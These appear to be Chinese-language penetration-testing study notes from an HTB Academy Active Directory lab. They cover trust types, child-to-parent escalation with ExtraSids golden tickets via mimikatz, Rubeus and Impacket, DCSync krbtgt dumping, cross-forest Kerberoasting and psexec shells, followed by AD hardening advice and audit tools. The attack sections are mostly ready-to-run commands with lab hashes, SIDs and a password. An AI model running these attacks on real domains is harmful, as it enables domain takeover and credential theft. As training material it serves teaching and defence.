SID列表
https://adsecurity.org/?p=1001

父子 (Parent-child)：同一林中的两个或多个域。子域与父域具有双向可传递信任，子域 corp.inlanefreight.local 中的用户可以验证登录到父域 inlanefreight.local，反之亦然
跨链接 (Cross-link)：子域之间的信任，用于加速身份验证
外部 (External)：在两个独立林中、尚未通过林信任连接的两个独立域之间的不可传递信任，这种类型的信任利用 SID 筛选 (SID filtering) 或过滤掉非来自受信任域的身份验证请求（通过 SID）
树根 (Tree-root)：林根域与新树根域之间的双向可传递信任。当你在林中设置一个新的树根域时，它们是按设计创建的
林 (Forest)：两个林根域之间的可传递信任
ESAE：用于管理 Active Directory 的堡垒林 (bastion forest)      https://learn.microsoft.com/en-us/security/privileged-access-workstations/esae-retirement


信任可以是可传递的或不可传递的
可传递 (transitive) 信任意味着信任关系会扩展到子域所信任的对象，如果 域 A 与 域 B 有信任关系，而 域 B 与 域 C 有 可传递 信任关系，那么 域 A 将自动信任 域 C
不可传递 (non-transitive) 信任中，只有子域本身被信任，不会扩展到下一级子域


信任可以设置两个方向：单向或双向（bidirectional）


C:\htb> Import-Module activedirectory      枚举信任
C:\htb> Get-ADTrust -Filter *
可以利用 PowerView 和 BloodHound 来枚举信任关系、已建立的信任类型以及身份验证流程
C:\htb> Get-DomainTrust            PowerView
C:\htb> Get-DomainTrustMapping     递归，更详细
C:\htb> Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName      检查子域中的用户
另一个工具是 netdom
C:\htb> netdom query /domain:inlanefreight.local trust
C:\htb> netdom query /domain:inlanefreight.local dc
C:\htb> netdom query /domain:inlanefreight.local workstation
还可以使用 BloodHound 通过 Map Domain Trusts 预构建查询来可视化这些信任关系


KRBTGT 帐户可用于创建 Kerberos TGT 票据
这些票据可用于请求域中任何主机上任何服务的 TGS 票据，也被称为黄金票据攻击
要使黄金票据失效的唯一方法是更改 KRBTGT 帐户的密码


子域攻击父域Windows
需要下面的信息
  子域的 KRBTGT 哈希
  子域的 SID
  子域中目标用户的名称（无需真实存在！）
  子域的 FQDN (完全限定域名)
  根域的 Enterprise Admins 组的 SID

C:\htb>  mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt       获取 KRBTGT 帐户的 NT 哈希
C:\htb> Get-DomainSID      获得域本身的SID
C:\htb> Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid      获取 Enterprise Admins 组的 SID

C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$      确认目前没有访问权限

C:\htb> mimikatz.exe                              创建黄金票据
mimikatz # kerberos::golden /user:hacker
/domain:LOGISTICS.INLANEFREIGHT.LOCAL
/sid:S-1-5-21-2806153819-209893948-922872689
/krbtgt:9d765b482771505cbe97411065964d5f
/sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt

C:\htb> klist      查看目前内存中的hacker票据
从这里开始，就可以访问父域内的任何资源
C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$      可以访问了
也可以使用 Rubeus 执行此攻击
C:\htb>  .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f
/domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689
/sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
cat \\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\c$\ExtraSids\flag.txt      查看文件

通过对父域执行 DCSync 攻击来测试此访问权限，目标是 lab_adm 域管理员用户
C:\Tools\mimikatz\x64> .\mimikatz.exe
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL            目标域与用户所在的域不同时，加确切目标域 /domain:INLANEFREIGHT.LOCA


子域攻击父域Linux

控制了子域后
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt      执行 DCSync 攻击，获得子域的 KRBTGT 哈希
用lookupsid.py 爆破 SID，以找到子域的 SID
  https://github.com/fortra/impacket/blob/master/examples/lookupsid.py
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"      加过滤
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"            父域中EA组的SID
用 Impacket 工具包中的 ticketer.py 来构建一个黄金票据
  https://github.com/fortra/impacket/blob/master/examples/ticketer.py
ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL
-domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
票据将以凭据缓存 (credential cache, ccache) 文件的形式保存到我们的系统中，这是一种用于保存 Kerberos 凭据的文件
export KRB5CCNAME=hacker.ccache       设置 KRB5CCNAME 环境变量会告知系统在进行 Kerberos 身份验证尝试时使用此文件
使用 Impacket 的 psexec.py 获取 SYSTEM shell
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5

Impacket 还有一个工具 raiseChild.py，它可以自动完成从子域到父域的提权过程，需要指定目标域控制器和子域中管理员用户的凭据
  https://github.com/fortra/impacket/blob/master/examples/raiseChild.py
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm


跨林攻击Windows
C:\htb> Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName      枚举 SPN 账户
C:\htb> Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof      枚举 mssqlsvc 账户
C:\htb> .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap            跨林攻击
hashcat -m 13100 -w 3 -O hash.txt /usr/share/wordlists/rockyou.txt

C:\htb> Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL      枚举不属于本域用户的组
C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator      通过 WinRM 连接来验证此访问权限

如果一个用户从一个林迁移到另一个林，并且没有启用 SID 筛选 (SID Filtering)，那么就有可能添加来自另一个林的 SID，而这个 SID 在跨信任进行身份验证时会被添加到用户的令牌 (token) 中

跨林攻击Linux
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley      枚举 SPN 账户
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley        -request 获得TGS票据
  添加 -outputfile <OUTPUT FILE> 将其直接输出到一个文件中
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
smbexec.py freightlogistics/sapsso@freightlogistics.local      用明文登录目标

使用 BloodHound 的 Python 实现 来收集这些信息
  https://github.com/dirkjanm/BloodHound.py
在一台没有配置域内 DNS 的攻击主机上。在这种情况下，需要编辑我们的 resolv.conf 文件
echo 'domain INLANEFREIGHT.LOCAL' >> /etc/resolv.conf
echo 'nameserver 172.16.5.5' >> /etc/resolv.conf
bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2      
zip -r ilfreight_bh.zip *.json      单独的 zip 文件上传到 BloodHound GUI 中



防御
需要记录和跟踪的事项
  OU (组织单位)、计算机、用户、组的命名约定
  DNS、网络和 DHCP 配置
  对所有 GPO (组策略对象) 及其应用对象的深入了解
  FSMO 角色的分配
  完整且最新的应用程序清单
  所有企业主机及其位置的列表
  我们与其他域或外部实体建立的任何信任关系
  拥有提升权限的用户

以下措施是开始保护 AD 环境中“人”这一要素的好方法。
  组织应有强大的密码策略，并配备密码过滤器，禁止使用常见词语（例如：welcome、password、月份/星期/季节的名称以及公司名称）。如果可能，应使用企业级密码管理器来帮助用户选择和使用复杂密码。
  定期轮换所有服务账户的密码。
  禁止在用户工作站上使用本地管理员访问权限，除非存在特定的业务需求。
  禁用默认的 RID-500 本地管理员账户，并创建一个新的管理员账户用于管理，该账户受 LAPS (本地管理员密码解决方案) 的密码轮换管理。
  为管理员用户实施分层管理模型。在评估过程中，我们经常会在管理员用于所有工作活动的计算机上获得域管理员凭据。
  清理特权组。组织是否需要 50 多个域/企业管理员？ 将高特权组的成员资格限制为仅那些需要此访问权限来执行其日常系统管理员职责的用户。
  在适当的情况下，将账户放入 Protected Users 组。
  禁用管理员账户的 Kerberos 委托（Protected Users 组可能不会这样做）。

Protected Users 组，提供以下域控制器和设备保护：
  组成员不能被赋予约束或非约束委托。
  即使在组策略中设置了“允许委派默认凭据”，CredSSP (凭据安全支持提供程序) 也不会在内存中缓存明文凭据。
  即使启用了 Windows 摘要式身份验证，Windows 摘要式身份验证也不会缓存用户的明文密码。
  成员不能使用 NTLM 身份验证或使用 DES 或 RC4 密钥。
  获取 TGT (票据授予票据) 后，用户的长期密钥或明文凭据不会被缓存。
  成员不能续订超过原始 4 小时 TTL (生存时间) 的 TGT。
  注意：`Protected Users` 组可能会导致意外的身份验证问题，这很容易导致账户锁定。一个组织绝不应在未经分阶段测试的情况下，将所有特权用户都放入此组。

流程、策略和程序
  适当的 AD 资产管理策略和程序。
  AD 主机审计、资产标签的使用以及定期的资产盘点可以帮助确保主机不会丢失。
  访问控制策略（用户账户的开通/停用）、多因素认证 (MFA) 机制。
  主机配置和退役的流程（例如，基线安全加固指南、黄金镜像）。
  AD 清理策略
  前员工的账户是被删除还是仅仅被禁用？
  从 AD 中删除过期记录的流程是什么？
  退役旧版操作系统/服务的流程（例如，迁移到 O365 时正确卸载 Exchange）。
  用户、组和主机的审计计划。

工具或应用程序的漏洞
  定期运行 BloodHound、PingCastle 和 Grouper 等工具来识别 AD 错误配置。
  确保管理员不会将密码存储在 AD 账户的描述字段中。
  审查 SYSVOL 中是否含有包含密码和其他敏感数据的脚本。
  避免使用“普通”服务账户，尽可能使用组托管服务账户 (gMSA) 和托管服务账户 (MSA) 来降低 Kerberoasting 攻击的风险。
  尽可能禁用非约束性委托 (Unconstrained Delegation)。
  通过使用加固的跳板机 (jump host) 来防止直接访问域控制器。
  考虑将 ms-DS-MachineAccountQuota 属性设置为 0，这会禁止用户添加机器账户，并可以防止多种攻击，如 noPac 攻击和基于资源的约束性委托 (RBCD)。
  尽可能禁用打印后台处理程序服务，以防止多种攻击。
  如果可能，为域控制器禁用 NTLM 身份验证。
  使用身份验证扩展保护，并启用“仅要求 SSL”以仅允许对证书颁发机构 Web 注册和证书注册 Web 服务使用 HTTPS 连接。
  启用 SMB 签名和 LDAP 签名。
  采取措施防止使用 BloodHound 等工具进行枚举。
  理想情况下，应每季度进行一次渗透测试/AD 安全评估，但如果预算有限，至少应每年进行一次。
  测试备份的有效性，并审查/演练灾难恢复计划。
  启用对匿名访问的限制，并通过将 RestrictNullSessAccess 注册表项设置为 1 来防止空会话枚举，以限制未经身份验证的用户的空会话访问。

MITRE 标签将控制措施关联起来
  https://attack.mitre.org/tactics/enterprise/


AD Explorer 是 Sysinternal Suite 的一部分，其描述如下：
  https://learn.microsoft.com/en-us/sysinternals/downloads/adexplorer
一款 Active Directory (AD) 查看器和编辑器
可以使用 AD Explorer 轻松浏览 AD 数据库、定义常用位置、查看对象属性和特性而无需打开对话框、编辑权限、查看对象架构以及执行可以保存和重新执行的复杂搜索
可以用于保存 AD 数据库的快照 (snapshot)，以供离线查看和比较
可以在某个时间点对 AD 进行快照，并在报告阶段稍后进行探索，就像探索任何其他数据库一样
还可以用于对 AD 进行前后比较，以发现对象、属性和安全权限的变化

PingCastle 
  https://www.pingcastle.com/documentation/
可以评估 AD 环境的安全态势 (security posture)，并以多种不同的地图和图表形式向我们提供结果
在企业中，以用户易读的域地图形式收集一个活跃的主机清单 (inventory)
PingCastle 与 PowerView 和 BloodHound 等工具不同
除了攻击的枚举数据 (enumeration data) 
还使用基于风险评估/成熟度框架 (risk assessment/maturity framework) 的方法，提供目标域安全级别的详细报告
报告中显示的分数基于能力成熟度模型集成 (Capability Maturity Model Integration, CMMI)

C:\htb> PingCastle.exe --help      查看帮助
要运行 PingCastle，在 CMD 或 PowerShell 窗口中输入 PingCastle.exe
默认选项是 healthcheck（健康检查）运行，它将建立域的基线概览，提供与配置错误和漏洞相关的相关信息
在整个报告中，有诸如域、用户、组和信任信息等部分，还有一个专门的表格指出“异常”或可能需要立即关注的问题

Group3r
一款专门为发现 Active Directory 相关组策略中的漏洞而构建的工具
必须从已加入域的主机 (domain-joined host) 上以域用户身份运行（无需是管理员），或在域用户上下文中运行（例如，使用 runas /netonly）
C:\htb> group3r.exe -f <filepath-name.log> 

ADRecon
可用于一次性从 AD 中收集大量数据，在不需要隐秘行动的评估中，分析其结果也是值得的，以防所有的枚举都遗漏了一些可能有用或值得向客户指出的微小细节
C:\htb> .\ADRecon.ps1
完成后，执行的目录下会创建一个新文件夹，并将报告放入其中
将获得一个 HTML 格式的报告和一个包含 CSV 结果的文件夹
生成报告时需要安装 Excel 程序，否则脚本不会自动生成该格式的报

